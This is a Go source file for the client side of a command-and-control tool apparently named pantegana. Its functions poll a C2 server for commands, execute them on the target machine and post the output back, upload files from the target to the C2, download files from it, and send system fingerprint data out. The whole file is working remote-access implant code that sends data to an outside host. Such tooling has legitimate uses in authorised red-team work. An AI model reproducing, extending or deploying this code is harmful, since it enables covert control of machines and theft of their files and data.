package client

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/elleven11/pantegana/client/fingerprinter"
)

// RequestCommand sends a HTTPS GET request to the master pantegana server
// /getCmd endpoint and returns the parsed command string.
func (c *Client) RequestCommand() string {
	log.Println("[+] Calling home to c2 to get cmd...")

	var httpstr string
	if c.Cfg.HasTLS {
		httpstr = "https"
	} else {
		httpstr = "http"
	}

	hoststr := fmt.Sprintf("%s://%s:%d", httpstr, c.Cfg.Host, c.Cfg.Port)

	req, err := http.NewRequest("GET", hoststr+getCmdURL, nil)
	if err != nil {
		log.Printf("[-] Error creating the GET request: %s\n", err)
	}

	req.Header.Add("Token", c.Token)

	resp, err := c.HTTP.Do(req)
	if err != nil {
		log.Printf("[-] Got error when requesting cmd: %s\n", err)
		if strings.Contains(err.Error(), ErrHTTPResponse.Error()) {
			// try with plaintext HTTP
			c.Cfg.HasTLS = false
			defer log.Printf("[+] Retrying with HTTP...\n")
			return c.RequestCommand()
		}
		log.Println("Retrying in 5 seconds...")
		time.Sleep(5 * time.Second)
		return c.RequestCommand()
	}

	c.BaseURL = hoststr // Defining the BaseURL for the client

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("[-] Error while reading body of request: %s", err)
	}
	log.Printf("[+] Got cmd from backend:\n%s\n", body)
	if string(body) == "Client sent an HTTP request to an HTTPS server.\n" {
		c.Cfg.HasTLS = true
		defer log.Printf("[+] Retrying with HTTPS...\n")
		return c.RequestCommand()
	}

	defer resp.Body.Close()
	return strings.Trim(string(body), " \n\r")
}

// ExecAndGetOutput executes the command string on the OS
// and returns the combined output.
func (c *Client) ExecAndGetOutput(url string, cmdString string) {
	log.Println("[+] Executing cmd...")
	cmdTokens := strings.Split(cmdString, " ")
	log.Println(cmdTokens)
	cmd := exec.Command(cmdTokens[0], cmdTokens[1:]...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("[-] Failed to execute cmd with error: %s\n", err)
		out = []byte("Failed to execute cmd")
	}

	log.Printf("[+] Sending back output:\n%s\n", string(out))
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(out))
	if err != nil {
		log.Printf("[-] Error creating the POST request: %s\n", err)
		return
	}

	req.Header.Add("Token", c.Token)
	req.Header.Set("Content-Type", "text/html")

	c.HTTP.Do(req)
}

// UploadFile uploads a local file on the target machine to the c2.
func (c *Client) UploadFile(url string, localFilePath string, remoteFilePath string) {
	// open the file of interest
	file, err := os.Open(localFilePath)
	if err != nil {
		log.Printf("[-] Error opening file: %s\n", err)
		return
	}
	defer file.Close()

	// create the form file
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("uploadFile", filepath.Base(remoteFilePath))
	if err != nil {
		log.Printf("[-] Error creating form file: %s\n", err)
		return
	}
	_, err = io.Copy(part, file)
	err = writer.Close()
	if err != nil {
		log.Printf("[-] Error closing the multipart writer: %s\n", err)
		return
	}

	// create the request
	req, err := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	if err != nil {
		log.Printf("[-] Error creating the request: %s\n", err)
		return
	}

	// send it off
	_, err = c.HTTP.Do(req)
	if err != nil {
		log.Printf("[-] Error sending upload request: %s\n", err)
		return
	}
	log.Println("[+] Uploaded file.")
}

// DownloadFile downloads a file from the c2 to the local target machine.
func (c *Client) DownloadFile(url string, filePath string) {
	// get the file data
	log.Println(url)
	resp, err := c.HTTP.Get(url)
	if err != nil {
		log.Printf("[-] Error getting file to download from c2: %s\n", err)
		return
	}
	defer resp.Body.Close()

	// create downloads dir if not existant yet
	_ = os.Mkdir("downloads", 0755)
	// create local file
	out, err := os.Create("downloads/" + filePath)
	if err != nil {
		log.Printf("[-] Error creating local file: %s\n", err)
		return
	}
	defer out.Close()

	// and write data to it
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		log.Printf("[-] Error writing to local file: %s\n", err)
		return
	}
	log.Println("[+] Successfully downloaded file")
}

func (c *Client) SendSysInfo(url string, sysInfo fingerprinter.SysInfo) {
	data, _ := json.Marshal(sysInfo)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
	if err != nil {
		log.Printf("[-] Error creating the POST request: %s\n", err)
		return
	}

	req.Header.Add("Token", c.Token)
	req.Header.Set("Content-Type", "application/json")

	c.HTTP.Do(req)
}
